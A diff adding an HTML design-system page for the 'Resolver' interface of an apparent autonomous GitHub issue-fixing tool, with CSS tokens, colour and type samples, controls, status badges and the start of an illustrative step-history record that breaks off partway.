@@ -1,0 +1,440 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Resolver Theme</title>
+<link rel="stylesheet" href="theme/tokens.css">
+<script src="https://unpkg.com/lucide@0.469.0/dist/umd/lucide.min.js"></script>
+<style>
+  body { display: grid; grid-template-columns: var(--rail-width) 1fr; min-height: 100vh; }
+  svg.lucide { width: 16px; height: 16px; stroke-width: 1.75; flex: none; }
+
+  /* ── Rail ── */
+  .rail { position: sticky; top: 0; height: 100vh; background: var(--cover); color: var(--cover-ink); display: flex; flex-direction: column; padding: var(--space-5) var(--space-3); }
+  .brand { display: flex; align-items: center; gap: var(--space-2); padding: 0 var(--space-3); margin-bottom: var(--space-8); font-weight: var(--weight-bold); font-size: var(--text-md); }
+  .brand-mark { width: 24px; height: 24px; border-radius: var(--radius-sm); background: var(--surface); color: var(--cover); display: grid; place-items: center; }
+  .brand-mark svg.lucide { width: 14px; height: 14px; stroke-width: 2.25; }
+  .nav-group { font-size: var(--text-xs); color: var(--cover-ink-2); padding: var(--space-4) var(--space-3) var(--space-2); }
+  .nav { display: flex; align-items: center; gap: var(--space-3); height: 36px; padding: 0 var(--space-3); border-radius: var(--radius-md); color: var(--cover-ink-2); text-decoration: none; transition: background var(--dur-fast) var(--ease-out), color var(--dur-fast) var(--ease-out); }
+  .nav:hover { background: var(--cover-raised); color: var(--cover-ink); text-decoration: none; }
+  .nav[aria-current="page"] { background: var(--cover-active); color: var(--cover-ink); }
+  .nav .count { margin-left: auto; font-size: var(--text-xs); background: var(--warning-tint); color: var(--warning); border-radius: var(--radius-full); padding: 0 var(--space-2); font-weight: var(--weight-semibold); }
+  .nav:focus-visible { outline-color: var(--blue-line); }
+  .rail-foot { margin-top: auto; border-top: 1px solid var(--cover-line); padding: var(--space-4) var(--space-3) 0; display: flex; align-items: center; gap: var(--space-3); }
+  .avatar { width: 28px; height: 28px; border-radius: var(--radius-full); background: #3a4a66; color: #fff; display: grid; place-items: center; font-size: var(--text-xs); font-weight: var(--weight-semibold); }
+  .rail-foot small { display: block; color: var(--cover-ink-2); font-size: var(--text-xs); line-height: var(--leading-xs); }
+
+  /* ── Page ── */
+  main { min-width: 0; padding: var(--space-10) var(--space-12) var(--space-16); max-width: 1240px; }
+  .page-head { display: grid; gap: var(--space-5); margin-bottom: var(--space-10); }
+  h1 { font-size: var(--text-2xl); line-height: var(--leading-2xl); font-weight: var(--weight-bold); margin: 0; letter-spacing: -0.01em; }
+  h2 { font-size: var(--text-xl); line-height: var(--leading-xl); font-weight: var(--weight-bold); margin: var(--space-16) 0 var(--space-2); }
+  h3 { font-size: var(--text-lg); line-height: var(--leading-lg); font-weight: var(--weight-semibold); margin: var(--space-8) 0 var(--space-3); }
+  .lead { color: var(--ink-2); max-width: 68ch; margin: var(--space-2) 0 0; }
+  .intro { color: var(--ink-2); max-width: 68ch; margin: 0 0 var(--space-6); }
+  .toc { display: flex; gap: var(--space-1); flex-wrap: wrap; }
+  .toc a { font-size: var(--text-sm); padding: var(--space-1) var(--space-3); border-radius: var(--radius-full); border: 1px solid var(--border); background: var(--surface); color: var(--ink-2); text-decoration: none; }
+  .toc a:hover { border-color: var(--blue-line); color: var(--blue); }
+
+  /* ── Swatches ── */
+  .swatch-row { display: grid; grid-template-columns: repeat(var(--n, 6), minmax(0, 1fr)); gap: var(--space-3); }
+  .swatch { background: var(--surface); border: 1px solid var(--border); border-radius: var(--radius-md); overflow: hidden; }
+  .chip { height: 64px; border-bottom: 1px solid var(--border); }
+  .swatch div:last-child { padding: var(--space-2) var(--space-3) var(--space-3); }
+  .swatch b { display: block; font-size: var(--text-sm); font-weight: var(--weight-semibold); }
+  .swatch code { font-size: var(--text-xs); color: var(--ink-2); }
+  .swatch p { margin: var(--space-1) 0 0; font-size: var(--text-xs); line-height: var(--leading-xs); color: var(--ink-3); }
+
+  /* ── Type ── */
+  .families { display: grid; grid-template-columns: 1fr 1fr; gap: var(--space-4); }
+  .panel { background: var(--surface); border: 1px solid var(--border); border-radius: var(--radius-md); padding: var(--space-5) var(--space-6); }
+  .family-name { font-size: var(--text-3xl); line-height: var(--leading-3xl); font-weight: var(--weight-bold); margin: var(--space-1) 0 var(--space-3); }
+  .meta { font-size: var(--text-sm); color: var(--ink-3); }
+  .scale-row { display: grid; grid-template-columns: 160px 1fr; align-items: baseline; gap: var(--space-6); padding: var(--space-3) 0; border-bottom: 1px solid var(--rule); }
+  .scale-row:last-child { border-bottom: 0; }
+  .scale-row .meta code { color: var(--ink-2); }
+
+  /* ── Space / shape / depth ── */
+  .tri { display: grid; grid-template-columns: 1.3fr 1fr 1fr; gap: var(--space-4); }
+  .space-bar { display: flex; align-items: center; gap: var(--space-3); font-size: var(--text-xs); color: var(--ink-2); height: 24px; }
+  .space-bar span:first-child { width: 72px; font-family: var(--font-mono); }
+  .space-bar i { display: block; height: 12px; background: var(--blue-line); border-radius: 2px; }
+  .shape { display: grid; grid-template-columns: repeat(4, 1fr); gap: var(--space-3); }
+  .shape div { min-width: 0; height: 56px; border: 1px solid var(--border-strong); background: var(--sheet); display: grid; place-items: end start; padding: var(--space-1) var(--space-2); font-size: var(--text-xs); color: var(--ink-2); }
+  .depth { display: grid; gap: var(--space-4); }
+  .depth div { background: var(--surface); border-radius: var(--radius-md); padding: var(--space-3) var(--space-4); font-size: var(--text-sm); }
+
+  /* ── Controls ── */
+  .row { display: flex; gap: var(--space-3); align-items: center; flex-wrap: wrap; }
+  .state-label { font-size: var(--text-xs); color: var(--ink-3); width: 100%; margin-top: var(--space-3); }
+  .btn { display: inline-flex; align-items: center; gap: var(--space-2); height: 36px; padding: 0 var(--space-4); border-radius: var(--radius-md); border: 1px solid transparent; font: var(--weight-semibold) var(--text-md) / 1 var(--font-ui); cursor: pointer; transition: background var(--dur-fast) var(--ease-out), border-color var(--dur-fast) var(--ease-out), box-shadow var(--dur-fast) var(--ease-out); }
+  .btn-sm { height: 30px; padding: 0 var(--space-3); font-size: var(--text-sm); }
+  .btn-primary { background: var(--blue); color: var(--ink-on-accent); box-shadow: var(--shadow-sm); }
+  .btn-primary:hover, .btn-primary.is-hover { background: var(--blue-hover); }
+  .btn-primary:active, .btn-primary.is-active { background: var(--blue-pressed); }
+  .btn-secondary { background: var(--surface); color: var(--ink); border-color: var(--border-strong); box-shadow: var(--shadow-sm); }
+  .btn-secondary:hover, .btn-secondary.is-hover { background: var(--sheet); border-color: var(--ink-3); }
+  .btn-ghost { background: transparent; color: var(--ink-2); }
+  .btn-ghost:hover, .btn-ghost.is-hover { background: var(--neutral-tint); color: var(--ink); }
+  .btn-danger { background: var(--red); color: var(--ink-on-accent); box-shadow: var(--shadow-sm); }
+  .btn-danger:hover, .btn-danger.is-hover { background: var(--red-hover); }
+  .btn-danger-outline { background: var(--surface); color: var(--red); border-color: var(--red-line); }
+  .btn-danger-outline:hover, .btn-danger-outline.is-hover { background: var(--red-tint); }
+  .btn.is-focus { outline: 2px solid var(--focus); outline-offset: 2px; }
+  .btn:disabled { background: var(--neutral-tint); color: var(--ink-disabled); border-color: transparent; box-shadow: none; cursor: not-allowed; }
+  .spin { animation: spin 0.9s linear infinite; }
+  @keyframes spin { to { transform: rotate(360deg); } }
+
+  .field { display: grid; gap: var(--space-1); width: 260px; }
+  .field label { font-size: var(--text-sm); font-weight: var(--weight-semibold); }
+  .input { height: 36px; border: 1px solid var(--border-strong); border-radius: var(--radius-md); background: var(--surface); padding: 0 var(--space-3); font: var(--text-md) var(--font-ui); color: var(--ink); display: flex; align-items: center; gap: var(--space-2); }
+  .input::placeholder { color: var(--ink-3); }
+  .input:focus, .input.is-focus { outline: none; border-color: var(--blue); box-shadow: 0 0 0 3px #c9d6f1; }
+  .input.is-error { border-color: var(--red); box-shadow: 0 0 0 3px #f6d3d4; }
+  .input:disabled { background: var(--surface-sunken); color: var(--ink-disabled); border-color: var(--border); }
+  .hint { font-size: var(--text-xs); line-height: var(--leading-xs); color: var(--ink-3); }
+  .hint.err { color: var(--red); display: flex; gap: var(--space-1); align-items: center; }
+  .hint.err svg.lucide { width: 14px; height: 14px; }
+  select.input { appearance: none; background: var(--surface) url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='16' height='16' fill='none' stroke='%2347515e' stroke-width='1.75' stroke-linecap='round' stroke-linejoin='round' viewBox='0 0 24 24'%3E%3Cpath d='m6 9 6 6 6-6'/%3E%3C/svg%3E") no-repeat right 10px center; padding-right: 32px; }
+  .check { display: inline-flex; gap: var(--space-2); align-items: center; font-size: var(--text-md); }
+  .check input { width: 16px; height: 16px; margin: 0; }
+
+  /* ── Status badges: icon + word, never colour alone ── */
+  .badge { display: inline-flex; align-items: center; gap: 6px; height: 24px; padding: 0 var(--space-2); border-radius: var(--radius-sm); font-size: var(--text-xs); font-weight: var(--weight-semibold); border: 1px solid; white-space: nowrap; }
+  .badge svg.lucide { width: 14px; height: 14px; stroke-width: 2; }
+  .b-running { background: var(--blue-tint); color: var(--blue); border-color: var(--blue-line); }
+  .b-success { background: var(--success-tint); color: var(--success); border-color: var(--success-line); }
+  .b-review  { background: var(--warning-tint); color: var(--warning); border-color: var(--warning-line); }
+  .b-struck  { background: var(--surface); color: var(--red); border-color: var(--red-line); }
+  .b-danger  { background: var(--red-tint); color: var(--red); border-color: var(--red-line); }
+  .b-neutral { background: var(--neutral-tint); color: var(--ink-2); border-color: var(--border); }
+  .id { font: var(--weight-medium) var(--text-xs) var(--font-mono); color: var(--ink-2); background: var(--surface-sunken); border: 1px solid var(--rule); border-radius: var(--radius-sm); padding: 1px 6px; }
+
+  /* ── Signature: the step record ── */
+  .record { background: var(--sheet); border: 1px solid var(--border); border-radius: var(--radius-md); overflow: hidden; }
+  .record-head { display: flex; justify-content: space-between; align-items: center; padding: var(--space-3) var(--space-5); background: var(--surface); border-bottom: 1px solid var(--border); }
+  .record-head b { font-size: var(--text-md); }
+  .steps { list-style: none; margin: 0; padding: 0; }
+  .step { display: grid; grid-template-columns: 56px 1fr auto; align-items: center; min-height: var(--row); border-bottom: 1px solid var(--rule); padding-right: var(--space-5); }
+  .step > .n { font: var(--weight-medium) var(--text-xs) var(--font-mono); color: var(--ink-3); text-align: right; padding-right: var(--space-3); align-self: stretch; display: flex; align-items: center; justify-content: flex-end; border-right: 1px solid var(--margin-line); }
+  .step .cmd { font: var(--text-sm) / var(--leading-sm) var(--font-mono); color: var(--ink); padding-left: var(--space-4); }
+  .step.struck > .n { grid-row: span 2; }
+  .step.current { background: var(--blue-tint); }
+  .step.current .cmd { color: var(--blue); font-weight: var(--weight-medium); }
+  /* The correction strike: one 2px red line, drawn left to right, text stays legible */
+  .step.struck .cmd { color: var(--ink-3); background: linear-gradient(var(--red), var(--red)) no-repeat 0 55% / 100% 2px; padding-left: 0; margin-left: var(--space-4); transition: background-size var(--dur-strike) var(--ease-out); justify-self: start; }
+  .step.struck.redraw .cmd { background-size: 0% 2px; transition: none; }
+  .correction { grid-column: 2 / 4; padding: 0 0 var(--space-3) var(--space-4); font-size: var(--text-xs); line-height: var(--leading-xs); color: var(--red); display: flex; gap: var(--space-2); align-items: center; }
+  .correction svg.lucide { width: 14px; height: 14px; }
+  .step.root { background: var(--surface); }
+
+  /* ── Log well ── */
+  .log { background: var(--surface-sunken); border: 1px solid var(--border); border-radius: var(--radius-md); padding: var(--space-3) var(--space-4); font: var(--text-sm) / var(--leading-sm) var(--font-mono); color: var(--ink); margin: 0; white-space: pre-wrap; }
+  .log .dim { color: var(--ink-3); }
+  .log .err { color: var(--red); }
+  .log .ok { color: var(--success); }
+  .log .mask { background: var(--ink); color: var(--ink); border-radius: 2px; padding: 0 2px; }
+
+  /* ── Witness review ── */
+  .review { background: var(--surface); border: 1px solid var(--red-line); border-radius: var(--radius-lg); box-shadow: var(--shadow-md); overflow: hidden; }
+  .review-head { background: var(--red-tint); padding: var(--space-4) var(--space-5); display: flex; gap: var(--space-3); align-items: start; border-bottom: 1px solid var(--red-line); }
+  .review-head svg.lucide { color: var(--red); width: 20px; height: 20px; margin-top: 2px; }
+  .review-head h3 { margin: 0; font-size: var(--text-lg); line-height: var(--leading-lg); }
+  .review-head p { margin: var(--space-1) 0 0; font-size: var(--text-sm); color: var(--ink-2); }
+  .review-body { padding: var(--space-4) var(--space-5); display: grid; gap: var(--space-4); }
+  .facts { display: grid; grid-template-columns: 140px 1fr; gap: var(--space-2) var(--space-4); font-size: var(--text-sm); margin: 0; }
+  .facts dt { color: var(--ink-3); }
+  .facts dd { margin: 0; }
+  .diff { border: 1px solid var(--border); border-radius: var(--radius-md); overflow: hidden; font: var(--text-sm) / var(--leading-sm) var(--font-mono); }
+  .diff-file { background: var(--surface-sunken); padding: var(--space-2) var(--space-3); border-bottom: 1px solid var(--border); color: var(--ink-2); font-size: var(--text-xs); }
+  .dl { display: grid; grid-template-columns: 40px 20px 1fr; padding: 0 var(--space-3) 0 0; }
+  .dl span:first-child { color: var(--ink-3); text-align: right; padding-right: var(--space-2); }
+  .dl.add { background: var(--diff-add); } .dl.add span:nth-child(2) { color: var(--diff-add-mark); }
+  .dl.del { background: var(--diff-del); } .dl.del span:nth-child(2) { color: var(--diff-del-mark); }
+  .dl mark { background: #f3c4c6; color: var(--ink); border-radius: 2px; padding: 0 2px; }
+  .sign { display: grid; grid-template-columns: 1fr 1fr; gap: var(--space-6); padding: var(--space-4) var(--space-5); border-top: 1px solid var(--rule); background: var(--sheet); }
+  .sign div { border-bottom: 1px solid var(--ink); padding-bottom: var(--space-1); font-size: var(--text-sm); }
+  .sign small { display: block; font-size: var(--text-xs); color: var(--ink-3); }
+  .sign .pending { color: var(--warning); font-weight: var(--weight-semibold); }
+  .review-foot { display: flex; justify-content: space-between; align-items: center; padding: var(--space-3) var(--space-5); border-top: 1px solid var(--border); }
+  .review-foot p { margin: 0; font-size: var(--text-xs); color: var(--ink-3); display: flex; gap: var(--space-1); align-items: center; }
+  .review-foot p svg.lucide { width: 14px; height: 14px; }
+
+  /* ── Table ── */
+  table { width: 100%; border-collapse: collapse; background: var(--surface); border: 1px solid var(--border); border-radius: var(--radius-md); overflow: hidden; font-size: var(--text-sm); }
+  th { text-align: left; font-weight: var(--weight-semibold); color: var(--ink-2); background: var(--surface-sunken); height: 36px; padding: 0 var(--space-4); border-bottom: 1px solid var(--border); }
+  th button { all: unset; display: inline-flex; gap: var(--space-1); align-items: center; cursor: pointer; }
+  th button svg.lucide { width: 14px; height: 14px; }
+  td { height: var(--row); padding: 0 var(--space-4); border-bottom: 1px solid var(--rule); }
+  tr:last-child td { border-bottom: 0; }
+  tbody tr:hover { background: var(--sheet); }
+  tr.selected { background: var(--blue-tint); }
+  td.num { text-align: right; font-variant-numeric: tabular-nums; }
+  td .sub { color: var(--ink-3); }
+
+  /* ── Alerts, toast, empty ── */
+  .alert { display: flex; gap: var(--space-3); align-items: start; padding: var(--space-3) var(--space-4); border-radius: var(--radius-md); border: 1px solid; font-size: var(--text-sm); }
+  .alert b { display: block; }
+  .alert svg.lucide { margin-top: 2px; }
+  .a-info { background: var(--blue-tint); border-color: var(--blue-line); color: var(--ink); } .a-info svg { color: var(--blue); }
+  .a-warn { background: var(--warning-tint); border-color: var(--warning-line); } .a-warn svg { color: var(--warning-mark); }
+  .a-danger { background: var(--red-tint); border-color: var(--red-line); } .a-danger svg { color: var(--red); }
+  .toast { display: flex; gap: var(--space-3); align-items: center; background: var(--cover); color: var(--cover-ink); padding: var(--space-3) var(--space-4); border-radius: var(--radius-md); box-shadow: var(--shadow-lg); font-size: var(--text-sm); width: fit-content; }
+  .toast a { color: #b9cbf0; }
+  .empty { border: 1px dashed var(--border-strong); border-radius: var(--radius-md); background: var(--sheet); padding: var(--space-8); text-align: center; color: var(--ink-2); }
+  .empty h3 { margin: var(--space-2) 0 var(--space-1); color: var(--ink); font-size: var(--text-lg); }
+  .empty p { margin: 0 auto var(--space-4); max-width: 46ch; font-size: var(--text-sm); }
+
+  .two { display: grid; grid-template-columns: 1fr 1fr; gap: var(--space-4); align-items: start; }
+  @media (max-width: 1180px) {
+    body { grid-template-columns: 72px 1fr; }
+    .rail .label, .nav-group, .rail-foot div, .nav .count { display: none; }
+    .brand { justify-content: center; padding: 0; } .nav { justify-content: center; padding: 0; }
+    .rail-foot { justify-content: center; padding: var(--space-4) 0 0; }
+    main { padding: var(--space-8) var(--space-8) var(--space-12); }
+    .two, .families, .tri { grid-template-columns: 1fr; }
+    .swatch-row { grid-template-columns: repeat(auto-fill, minmax(140px, 1fr)); }
+  }
+</style>
+</head>
+<body>
+<nav class="rail" aria-label="Main">
+  <div class="brand"><span class="brand-mark"><i data-lucide="git-pull-request-arrow"></i></span><span class="label">Resolver</span></div>
+  <a class="nav" href="#"><i data-lucide="layout-dashboard"></i><span class="label">Overview</span></a>
+  <a class="nav" href="#" aria-current="page"><i data-lucide="list-checks"></i><span class="label">Runs</span></a>
+  <a class="nav" href="#"><i data-lucide="circle-plus"></i><span class="label">New run</span></a>
+  <a class="nav" href="#"><i data-lucide="shield-alert"></i><span class="label">Security findings</span><span class="count">2</span></a>
+  <a class="nav" href="#"><i data-lucide="scroll-text"></i><span class="label">Audit log</span></a>
+  <div class="nav-group">Organization</div>
+  <a class="nav" href="#"><i data-lucide="users"></i><span class="label">Members</span></a>
+  <a class="nav" href="#"><i data-lucide="coins"></i><span class="label">Usage &amp; costs</span></a>
+  <a class="nav" href="#"><i data-lucide="settings"></i><span class="label">Settings</span></a>
+  <div class="rail-foot"><span class="avatar">AJ</span><div>Adan J.<small>acme-labs · Owner</small></div></div>
+</nav>
+
+<main>
+  <header class="page-head">
+    <div>
+      <h1>Resolver theme</h1>
+      <p class="lead">The visual system for Autonomous GitHub Resolver. A run is kept like a signed lab record: nothing is erased, a rolled-back step is struck once and annotated, and a person countersigns risky changes. All sample data on this page is illustrative.</p>
+    </div>
+    <div class="toc"><a href="#colour">Colour</a><a href="#type">Type</a><a href="#space">Space &amp; shape</a><a href="#controls">Controls</a><a href="#record">Step record</a><a href="#review">Review</a><a href="#data">Tables &amp; feedback</a></div>
+  </header>
+
+  <section id="colour">
+    <h2>Colour</h2>
+    <p class="intro">Restrained, with colour doing real jobs. Black board-cover for the shell, a pale ruled page for work, ballpoint blue for action, correction red for anything a person must look at. Every state also carries an icon and a word.</p>
+    <h3>Shell and page</h3>
+    <div class="swatch-row" style="--n:6">
+      <div class="swatch"><div class="chip" style="background:var(--cover)"></div><div><b>Cover</b><code>#15171A</code><p>Side rail, toasts</p></div></div>
+      <div class="swatch"><div class="chip" style="background:var(--cover-active)"></div><div><b>Cover active</b><code>#2B3038</code><p>Current nav item</p></div></div>
+      <div class="swatch"><div class="chip" style="background:var(--page)"></div><div><b>Page</b><code>#EEF2F6</code><p>App background</p></div></div>
+      <div class="swatch"><div class="chip" style="background:var(--sheet)"></div><div><b>Sheet</b><code>#F8FAFC</code><p>Ruled working sheets</p></div></div>
+      <div class="swatch"><div class="chip" style="background:var(--surface)"></div><div><b>Surface</b><code>#FFFFFF</code><p>Cards, inputs, modals</p></div></div>
+      <div class="swatch"><div class="chip" style="background:var(--surface-sunken)"></div><div><b>Sunken</b><code>#F2F5F9</code><p>Logs, code, table heads</p></div></div>
+    </div>
+    <h3>Ink and ruling</h3>
+    <div class="swatch-row" style="--n:7">
+      <div class="swatch"><div class="chip" style="background:var(--ink)"></div><div><b>Ink</b><code>#15171A</code><p>Primary text · 18:1</p></div></div>
+      <div class="swatch"><div class="chip" style="background:var(--ink-2)"></div><div><b>Ink 2</b><code>#47515E</code><p>Secondary text · 8:1</p></div></div>
+      <div class="swatch"><div class="chip" style="background:var(--ink-3)"></div><div><b>Ink 3</b><code>#5C6776</code><p>Muted, captions · 5.7:1</p></div></div>
+      <div class="swatch"><div class="chip" style="background:var(--rule)"></div><div><b>Rule</b><code>#D5E1EF</code><p>Lines between rows</p></div></div>
+      <div class="swatch"><div class="chip" style="background:var(--border)"></div><div><b>Border</b><code>#C7D3E2</code><p>Component edges</p></div></div>
+      <div class="swatch"><div class="chip" style="background:var(--border-strong)"></div><div><b>Border strong</b><code>#7690AD</code><p>Input borders · 3.3:1</p></div></div>
+      <div class="swatch"><div class="chip" style="background:var(--margin-line)"></div><div><b>Margin line</b><code>#E4A3A6</code><p>Step-record margin (decor)</p></div></div>
+    </div>
+    <h3>Action and states</h3>
+    <div class="swatch-row" style="--n:9">
+      <div class="swatch"><div class="chip" style="background:var(--blue)"></div><div><b>Ballpoint blue</b><code>#1E3A8A</code><p>Primary actions, links, running</p></div></div>
+      <div class="swatch"><div class="chip" style="background:var(--blue-tint)"></div><div><b>Blue tint</b><code>#E3EAF8</code><p>Selection, current step</p></div></div>
+      <div class="swatch"><div class="chip" style="background:var(--red)"></div><div><b>Correction red</b><code>#C2272D</code><p>Strikes, flags, destructive</p></div></div>
+      <div class="swatch"><div class="chip" style="background:var(--red-tint)"></div><div><b>Red tint</b><code>#FBEAEA</code><p>Flag panels, removed lines</p></div></div>
+      <div class="swatch"><div class="chip" style="background:var(--success)"></div><div><b>Success</b><code>#166534</code><p>Passed, approved, PR opened</p></div></div>
+      <div class="swatch"><div class="chip" style="background:var(--success-tint)"></div><div><b>Success tint</b><code>#E3F3E8</code><p>Added lines, success badge</p></div></div>
+      <div class="swatch"><div class="chip" style="background:var(--warning)"></div><div><b>Warning</b><code>#8A4B06</code><p>Awaiting review (text)</p></div></div>
+      <div class="swatch"><div class="chip" style="background:var(--warning-tint)"></div><div><b>Warning tint</b><code>#FDF1D8</code><p>Review badge, notices</p></div></div>
+      <div class="swatch"><div class="chip" style="background:var(--focus)"></div><div><b>Focus</b><code>#2F5BD3</code><p>Keyboard focus ring</p></div></div>
+    </div>
+  </section>
+
+  <section id="type">
+    <h2>Type</h2>
+    <p class="intro">One family in two cuts. Atkinson Hyperlegible was drawn for low-vision readers: letters that are easy to confuse (l / I / 1, 0 / O) are made distinct, which matters when people read hashes, step numbers and code all day.</p>
+    <div class="families">
+      <div class="panel"><div class="meta">UI · headings, labels, body, data</div><div class="family-name">Atkinson Hyperlegible Next</div><div class="meta">Regular 400 · Medium 500 · Semibold 600 · Bold 700</div></div>
+      <div class="panel"><div class="meta">Code · commands, logs, IDs, hashes, diffs</div><div class="family-name" style="font-family:var(--font-mono);font-weight:500">Atkinson Hyperlegible Mono</div><div class="meta">Regular 400 · Medium 500 · Semibold 600</div></div>
+    </div>
+    <div class="panel" style="margin-top:var(--space-4)">
+      <div class="scale-row"><div class="meta">3xl · 30/36 · Bold<br><code>--text-3xl</code></div><div style="font-size:var(--text-3xl);line-height:var(--leading-3xl);font-weight:700">182,430 tokens</div></div>
+      <div class="scale-row"><div class="meta">2xl · 24/32 · Bold<br><code>--text-2xl</code></div><div style="font-size:var(--text-2xl);line-height:var(--leading-2xl);font-weight:700">Refund webhook double-charges on retry</div></div>
+      <div class="scale-row"><div class="meta">xl · 20/28 · Bold<br><code>--text-xl</code></div><div style="font-size:var(--text-xl);line-height:var(--leading-xl);font-weight:700">Review flagged change</div></div>
+      <div class="scale-row"><div class="meta">lg · 16/24 · Semibold<br><code>--text-lg</code></div><div style="font-size:var(--text-lg);line-height:var(--leading-lg);font-weight:600">Step history</div></div>
+      <div class="scale-row"><div class="meta">md · 14/20 · Regular<br><code>--text-md</code></div><div>The agent restored the workspace to checkpoint CP-10 and trimmed its memory to step 10 after the dependency change broke 14 tests.</div></div>
+      <div class="scale-row"><div class="meta">sm · 13/20 · Regular<br><code>--text-sm</code></div><div style="font-size:var(--text-sm)">acme-labs/payments-api · opened 2 days ago by r.okafor</div></div>
+      <div class="scale-row"><div class="meta">xs · 12/16 · Regular<br><code>--text-xs</code></div><div style="font-size:var(--text-xs);line-height:var(--leading-xs);color:var(--ink-3)">Updated 4 seconds ago · smallest size allowed</div></div>
+      <div class="scale-row"><div class="meta">mono sm · 13/20<br><code>--font-mono</code></div><div style="font:var(--text-sm)/var(--leading-sm) var(--font-mono)">sha256 9f2c41e0b7a3 · prev 4be0917dd2c8 · pytest tests/webhooks -x</div></div>
+    </div>
+  </section>
+
+  <section id="space">
+    <h2>Space, shape and depth</h2>
+    <p class="intro">A 4px module. Rows are 40px tall, matching the ruling of the page, so step records, tables and nav line up. Corners stay small; depth is a soft offset shadow, never a glow.</p>
+    <div class="tri">
+      <div class="panel">
+        <div class="space-bar"><span>space-1</span><i style="width:4px"></i>4</div>
+        <div class="space-bar"><span>space-2</span><i style="width:8px"></i>8</div>
+        <div class="space-bar"><span>space-3</span><i style="width:12px"></i>12</div>
+        <div class="space-bar"><span>space-4</span><i style="width:16px"></i>16</div>
+        <div class="space-bar"><span>space-5</span><i style="width:20px"></i>20</div>
+        <div class="space-bar"><span>space-6</span><i style="width:24px"></i>24</div>
+        <div class="space-bar"><span>space-8</span><i style="width:32px"></i>32</div>
+        <div class="space-bar"><span>space-10</span><i style="width:40px"></i>40 · row</div>
+        <div class="space-bar"><span>space-12</span><i style="width:48px"></i>48</div>
+        <div class="space-bar"><span>space-16</span><i style="width:64px"></i>64</div>
+      </div>
+      <div class="panel"><div class="shape">
+        <div style="border-radius:var(--radius-sm)">sm 4</div><div style="border-radius:var(--radius-md)">md 6</div><div style="border-radius:var(--radius-lg)">lg 10</div><div style="border-radius:var(--radius-full);place-items:center">full</div>
+      </div><p class="meta" style="margin:var(--space-4) 0 0">sm: badges, checkboxes · md: buttons, inputs, cards · lg: modals, popovers</p></div>
+      <div class="panel depth" style="background:var(--sheet)">
+        <div style="box-shadow:var(--shadow-sm);border:1px solid var(--border)">shadow-sm · buttons, inputs</div>
+        <div style="box-shadow:var(--shadow-md)">shadow-md · menus, review panel</div>
+        <div style="box-shadow:var(--shadow-lg)">shadow-lg · modals, toasts</div>
+      </div>
+    </div>
+  </section>
+
+  <section id="controls">
+    <h2>Controls</h2>
+    <p class="intro">Standard controls, so nobody has to learn them. Buttons say what they do. Every control has hover, focus, pressed, disabled and loading states.</p>
+    <div class="panel">
+      <div class="row">
+        <button class="btn btn-primary"><i data-lucide="play"></i>Start run</button>
+        <button class="btn btn-secondary"><i data-lucide="download"></i>Export log</button>
+        <button class="btn btn-ghost">View details</button>
+        <button class="btn btn-danger-outline"><i data-lucide="square"></i>Cancel run</button>
+        <button class="btn btn-danger"><i data-lucide="x"></i>Reject change</button>
+        <button class="btn btn-primary btn-sm">Small</button>
+      </div>
+      <div class="row"><span class="state-label">Hover · focus · pressed · disabled · loading</span>
+        <button class="btn btn-primary is-hover">Hover</button>
+        <button class="btn btn-primary is-focus">Focus</button>
+        <button class="btn btn-primary is-active">Pressed</button>
+        <button class="btn btn-secondary is-hover">Hover</button>
+        <button class="btn btn-primary" disabled>Start run</button>
+        <button class="btn btn-primary" aria-busy="true"><i data-lucide="loader-circle" class="spin"></i>Starting…</button>
+      </div>
+    </div>
+    <div class="panel" style="margin-top:var(--space-4)">
+      <div class="row" style="align-items:start;gap:var(--space-6)">
+        <div class="field"><label for="f1">Repository</label><select id="f1" class="input"><option>acme-labs/payments-api</option></select><span class="hint">Repos from your connected GitHub account</span></div>
+        <div class="field"><label for="f2">Issue</label><input id="f2" class="input is-focus" value="#482 Refund webhook double-charges"><span class="hint">Focused</span></div>
+        <div class="field"><label for="f3">Email</label><input id="f3" class="input is-error" value="r.okafor@acme"><span class="hint err"><i data-lucide="circle-alert"></i>Enter a full email address, like name@company.com</span></div>
+        <div class="field"><label for="f4">Model</label><input id="f4" class="input" disabled value="Choose an issue first"><span class="hint">Disabled until an issue is chosen</span></div>
+      </div>
+      <div class="row" style="margin-top:var(--space-4)"><label class="check"><input type="checkbox" checked> Open the pull request as a draft</label><label class="check"><input type="checkbox"> Notify me when the run needs review</label></div>
+    </div>
+    <h3>Status</h3>
+    <div class="row">
+      <span class="badge b-running"><i data-lucide="loader-circle"></i>Running</span>
+      <span class="badge b-success"><i data-lucide="circle-check"></i>Passed</span>
+      <span class="badge b-struck"><i data-lucide="undo-2"></i>Rolled back</span>
+      <span class="badge b-review"><i data-lucide="pen-line"></i>Awaiting review</span>
+      <span class="badge b-success"><i data-lucide="git-pull-request"></i>PR opened</span>
+      <span class="badge b-danger"><i data-lucide="circle-x"></i>Failed</span>
+      <span class="badge b-danger"><i data-lucide="ban"></i>Rejected</span>
+      <span class="badge b-neutral"><i data-lucide="square"></i>Cancelled</span>
+      <span class="badge b-neutral"><i data-lucide="clock"></i>Queued</span>
+      <span class="id">RUN-0142</span><span class="id">CP-10</span><span class="id">FLAG-3</span>
+    </div>
+  </section>
+
+  <section id="record">
+    <h2>Step record</h2>
+    <p class="intro">The signature. Steps sit on 40px ruled rows with a red margin line. A rolled-back step is never hidden: its command is struck once in correction red and annotated with the checkpoint it returned to and why. The current step sits on a blue-tint band.</p>
+    <div class="two">
+      <div class="record">
+        <div class="record-head"><b>Step history</b><button class="btn btn-ghost btn-sm" id="replay"><i data-lucide="rotate-ccw"></i>Replay strike</button></div>
+        <ol class="steps">
+          <li class="step"><span class="n">09</span><span class="cmd">pytest tests/webhooks -x</span><span class="badge b-success"><i data-lucide="circle-check"></i>Passed</span></li>
+          <li class="step"><span class="n">10</span><span class="cmd">sed -i 's/retry=3/retry=0/' app/refunds.py</span><span class="id">CP-10</span></li>
+          <li class="step struck"><span class="n">11</span><span class="cmd">pip install requests==2.19.0</span><span class="badge b-struck"><i data-lucide="undo-2"></i>Rolled back</span>
+            <span class="correction"><i data-lucide="corner-down-right"></i>Struck · reverted to CP-10 · downgrade broke 14 tests · memory trimmed to step 10</span></li>
+          <li class="step"><span class="n">12</span><span class="cmd">git diff app/refunds.py</span><span class="id">CP-12</span></li>
